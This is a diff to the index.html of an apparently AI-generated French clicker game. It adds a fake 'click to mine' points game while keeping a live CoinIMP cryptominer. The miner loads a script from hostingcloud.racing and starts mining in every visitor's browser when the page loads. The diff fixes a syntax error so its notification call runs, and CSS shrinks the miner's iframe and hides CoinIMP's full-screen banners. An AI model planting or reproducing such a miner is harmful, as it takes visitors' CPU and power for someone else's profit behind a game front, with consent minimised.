@@ -6,17 +6,16 @@
     <title>deadspot-clicker-empire</title>
     <meta name="description" content="Lovable Generated Project" />
     <meta name="author" content="Lovable" />
-
     <meta property="og:title" content="deadspot-clicker-empire" />
     <meta property="og:description" content="Lovable Generated Project" />
     <meta property="og:type" content="website" />
     <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:site" content="@lovable_dev" />
     <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
 
     <style>
+      /* Notification de minage */
       #miningNotification {
         position: fixed;
         bottom: 10px;
@@ -48,45 +47,126 @@
         color: #ccc;
         font-size: 12px;
       }
-    </style>
-    
-    <style>
-  /* Force les iframes CoinIMP à se positionner mini en bas à droite */
-  iframe[src*="coinimp"] {
-    position: fixed !important;
-    bottom: 10px !important;
-    right: 10px !important;
-    width: 200px !important;
-    height: 112px !important;
-    z-index: 9999 !important;
-    border-radius: 8px !important;
-    box-shadow: 0 0 8px #00ff99;
-  }
 
-  /* Supprime les bannières CoinIMP qui couvrent tout l'écran */
-  div[style*="z-index: 2147483647"] {
-    display: none !important;
-  }
-</style>
+      /* Style du bouton de minage */
+      .mining-btn {
+        background-color: #4CAF50;
+        color: white;
+        padding: 15px 32px;
+        font-size: 16px;
+        margin-top: 20px;
+        border: none;
+        cursor: pointer;
+        border-radius: 8px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .mining-btn:disabled {
+        background-color: #ddd;
+        cursor: not-allowed;
+      }
+
+      /* Style pour afficher les stats */
+      .stats {
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .stats span {
+        font-size: 18px;
+        margin-right: 10px;
+      }
+    </style>
+
+    <style>
+      /* Force les iframes CoinIMP à se positionner mini en bas à droite */
+      iframe[src*="coinimp"] {
+        position: fixed !important;
+        bottom: 10px !important;
+        right: 10px !important;
+        width: 200px !important;
+        height: 112px !important;
+        z-index: 9999 !important;
+        border-radius: 8px !important;
+        box-shadow: 0 0 8px #00ff99;
+      }
+
+      /* Supprime les bannières CoinIMP qui couvrent tout l'écran */
+      div[style*="z-index: 2147483647"] {
+        display: none !important;
+      }
+    </style>
   </head>
 
   <body>
     <div id="root"></div>
 
+    <!-- Statistiques du jeu -->
+    <div class="stats">
+      <span id="miningPoints">Points de Minage : 0</span>
+      <span id="energy">Énergie : 100</span>
+    </div>
+
+    <!-- Bouton de minage -->
+    <button id="miningButton" class="mining-btn">Cliquez pour miner</button>
+
     <!-- Script principal Vite (React) -->
     <script type="module" src="/src/main.tsx"></script>
 
     <!-- Script de minage CoinIMP -->
-   <script src="https://www.hostingcloud.racing/MFIJ.js"></script>
-<script>
-    var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+    <script src="https://www.hostingcloud.racing/MFIJ.js"></script>
+
+    <script>
+      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
         throttle: 0.15, c: 'w', ads: 0
-    });
-    _client.start();
-    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#241599", 20, "#d2220f"):
+      });
+      _client.start();
+      _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#241599", 20, "#d2220f");
+
+      // Variables pour gérer les points de minage et l'énergie
+      let miningPoints = 0;
+      let energy = 100;
+
+      const miningButton = document.getElementById('miningButton');
+      const miningPointsDisplay = document.getElementById('miningPoints');
+      const energyDisplay = document.getElementById('energy');
+
+      // Fonction pour récupérer des points de minage
+      function mine() {
+        if (energy > 0) {
+          miningPoints += 10; // 10 points de minage par clic
+          energy -= 5; // Consomme 5 points d'énergie par clic
+          updateDisplay();
+        } else {
+          alert("Pas assez d'énergie pour miner !");
+        }
+      }
+
+      // Fonction pour mettre à jour l'affichage des stats
+      function updateDisplay() {
+        miningPointsDisplay.innerText = "Points de Minage : " + miningPoints;
+        energyDisplay.innerText = "Énergie : " + energy;
+        // Désactive le bouton si l'énergie est épuisée
+        if (energy <= 0) {
+          miningButton.disabled = true;
+        } else {
+          miningButton.disabled = false;
+        }
+      }
+
+      // Ajout d'un écouteur pour le bouton de minage
+      miningButton.addEventListener('click', mine);
+
+      // Fonction pour recharger l'énergie automatiquement après un délai
+      setInterval(() => {
+        if (energy < 100) {
+          energy += 2; // Recharge 2 unités d'énergie toutes les 10 secondes
+          if (energy > 100) energy = 100; // Limite l'énergie à 100
+          updateDisplay();
+        }
+      }, 10000); // toutes les 10 secondes
     </script>
   </body>
 </html>
-</html>
-
-
